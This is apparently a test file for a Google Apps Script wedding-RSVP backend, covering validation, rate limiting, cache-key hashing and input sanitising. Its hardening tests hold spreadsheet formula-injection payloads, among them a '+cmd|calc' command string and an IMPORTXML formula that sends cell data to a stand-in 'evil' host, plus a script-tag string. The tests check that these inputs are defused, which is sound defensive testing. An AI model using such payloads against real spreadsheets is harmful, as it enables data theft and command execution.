/**
 * Drives the real Code.gs against stubbed Google services.
 * Run: node apps-script/test/code.test.mjs
 */
import fs from 'node:fs';
import vm from 'node:vm';
import assert from 'node:assert';

// --- minimal stubs for the Apps Script runtime -----------------------------
class Sheet {
  constructor(name) { this.name = name; this.rows = []; }
  appendRow(r) { this.rows.push(r.slice()); }
  getLastRow() { return this.rows.length; }
  setFrozenRows() {}
  getRange(row, col, numRows = 1, numCols = 1) {
    const self = this;
    return {
      getValues() {
        const out = [];
        for (let i = 0; i < numRows; i++) {
          const src = self.rows[row - 1 + i] || [];
          out.push(Array.from({ length: numCols }, (_, j) => src[col - 1 + j] ?? ''));
        }
        return out;
      },
      setValues(vals) {
        for (let i = 0; i < vals.length; i++) {
          for (let j = 0; j < vals[i].length; j++) {
            self.rows[row - 1 + i][col - 1 + j] = vals[i][j];
          }
        }
      },
      setFontWeight() { return this; },
    };
  }
}
const book = {
  sheets: new Map(),
  getSheetByName(n) { return this.sheets.get(n) || null; },
  insertSheet(n) { const s = new Sheet(n); this.sheets.set(n, s); return s; },
};
globalThis.SpreadsheetApp = { openById: () => book };
globalThis.PropertiesService = {
  getScriptProperties: () => ({ getProperty: () => 'sheet-id' }),
};
const cache = new Map();
globalThis.CacheService = {
  getScriptCache: () => ({ get: k => cache.get(k) || null, put: (k, v) => cache.set(k, v) }),
};
globalThis.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
globalThis.ContentService = {
  MimeType: { JSON: 'json' },
  createTextOutput: t => ({ setMimeType() { return { _t: t }; } }),
};
globalThis.Logger = { log() {} };
const { createHash } = await import('node:crypto');
globalThis.Utilities = {
  DigestAlgorithm: { MD5: 'MD5' },
  Charset: { UTF_8: 'UTF_8' },
  // Apps Script hands back signed bytes; mirror that so the hex loop is tested.
  computeDigest: (_alg, value) =>
    [...createHash('md5').update(value, 'utf8').digest()].map(b => (b > 127 ? b - 256 : b)),
};

vm.runInThisContext(fs.readFileSync(new URL('../Code.gs', import.meta.url), 'utf8'));
const { doGet, doPost } = globalThis;

const parse = r => JSON.parse(r._t);
const post = b => { cache.clear(); return parse(doPost({ postData: { contents: JSON.stringify(b) } })); };

const accept = extra => ({
  action: 'rsvp', names: 'Alex & Sam Lee', attending: 'accepts',
  ceremony: true, reception: true, dietaryRestrictions: false, ...extra,
});

// --- happy paths -----------------------------------------------------------
let r = post(accept());
assert.equal(r.ok, true, 'a complete acceptance is stored');
assert.equal(r.data.attending, 'accepts');

const sheet = book.getSheetByName('Responses');
assert.equal(sheet.getLastRow(), 2, 'header row plus one response');
assert.deepEqual(sheet.rows[1].slice(1, 7),
  ['Alex & Sam Lee', 'accepts', true, true, false, '']);

r = post({ action: 'rsvp', names: 'Jo Park', attending: 'declines' });
assert.equal(r.ok, true, 'declining needs no further answers');
assert.deepEqual(sheet.rows[2].slice(2, 7), ['declines', '', '', '', ''],
  'ceremony, reception and dietary are left blank when declining');

post(accept({ dietaryRestrictions: true, dietaryNotes: 'No shellfish' }));
assert.equal(sheet.rows[3][6], 'No shellfish');

// Replies accumulate rather than overwrite: a lost reply is worse than two.
assert.equal(sheet.getLastRow(), 4, 'every submission appends a row');

// --- validation ------------------------------------------------------------
assert.equal(post(accept({ names: '' })).error, 'INVALID_NAMES');
assert.equal(post(accept({ names: 'A' })).error, 'INVALID_NAMES');
assert.equal(post(accept({ names: '   <b></b>  ' })).error, 'INVALID_NAMES',
  'markup-only names are rejected once stripped');
assert.equal(post(accept({ attending: 'maybe' })).error, 'INVALID_ATTENDING');
assert.equal(post(accept({ attending: undefined })).error, 'INVALID_ATTENDING');
assert.equal(post(accept({ ceremony: null })).error, 'INCOMPLETE');
assert.equal(post(accept({ reception: undefined })).error, 'INCOMPLETE');
assert.equal(post(accept({ dietaryRestrictions: null })).error, 'INCOMPLETE');
assert.equal(post(accept({ dietaryRestrictions: true, dietaryNotes: '' })).error, 'INCOMPLETE',
  'saying yes to dietary restrictions requires the detail');

// --- hardening -------------------------------------------------------------
post(accept({ names: '=HYPERLINK("evil")', dietaryRestrictions: true, dietaryNotes: '+cmd|calc' }));
const injected = sheet.rows[sheet.rows.length - 1];
assert.equal(injected[1], '\'=HYPERLINK("evil")', 'formula in names is defused');
assert.equal(injected[6], "'+cmd|calc", 'formula in notes is defused');

post(accept({ names: 'Tag <script>alert(1)</script> Test' }));
assert.equal(sheet.rows[sheet.rows.length - 1][1], 'Tag alert(1) Test', 'markup is stripped');

assert.equal(sheet.rows[sheet.rows.length - 1][7].length <= 200, true, 'user agent is capped');

const long = post(accept({ names: 'N'.repeat(500) }));
assert.equal(long.ok, true);
assert.equal(sheet.rows[sheet.rows.length - 1][1].length, 200, 'names are truncated');

// --- rate limiting ---------------------------------------------------------
cache.clear();
const body = { postData: { contents: JSON.stringify(accept()) } };
assert.equal(parse(doPost(body)).ok, true);
assert.equal(parse(doPost(body)).error, 'RATE_LIMITED', 'a double tap is absorbed');

// --- malformed requests ----------------------------------------------------
assert.equal(parse(doPost({})).error, 'INVALID_BODY');
assert.equal(parse(doPost({ postData: { contents: '{oops' } })).error, 'INVALID_JSON');
assert.equal(post({ action: 'nope' }).error, 'INVALID_ACTION');
assert.equal(parse(doGet()).error, 'INVALID_ACTION', 'there is nothing to read back');

// --- dedupe key -----------------------------------------------------------
// Names in a non-Latin script must not share a cache key: the second guest to
// reply inside the cooldown was being turned away as a duplicate.
cache.clear();
assert.equal(post(accept({ names: '김민준' })).ok, true);
const firstKey = [...cache.keys()][0];
assert.equal(parse(doPost({ postData: { contents: JSON.stringify(accept({ names: '이서연' })) } })).ok,
  true, 'a different non-Latin name must not collide');
assert.equal(new Set(cache.keys()).size, 2, 'distinct names get distinct keys');
assert.ok(/^rsvp-[0-9a-f]{32}$/.test(firstKey), `key should be hashed, got ${firstKey}`);

cache.clear();
assert.equal(post(accept({ names: 'Jo Park' })).ok, true);
assert.equal(parse(doPost({ postData: { contents: JSON.stringify(accept({ names: 'jo-park' })) } })).ok,
  true, 'different spellings are different guests');

// An identical resubmission is still absorbed.
cache.clear();
const twice = { postData: { contents: JSON.stringify(accept({ names: '김민준' })) } };
assert.equal(parse(doPost(twice)).ok, true);
assert.equal(parse(doPost(twice)).error, 'RATE_LIMITED', 'exact repeat is still caught');

// --- userAgent escaping ---------------------------------------------------
cache.clear();
post(accept({ names: 'Escaping Test', userAgent: '=IMPORTXML("http://evil/?"&A2,"//a")' }));
assert.equal(sheet.rows.at(-1)[7].startsWith("'"), true,
  'userAgent is guest-supplied and must be escaped like every other column');

console.log('backend: all assertions passed');
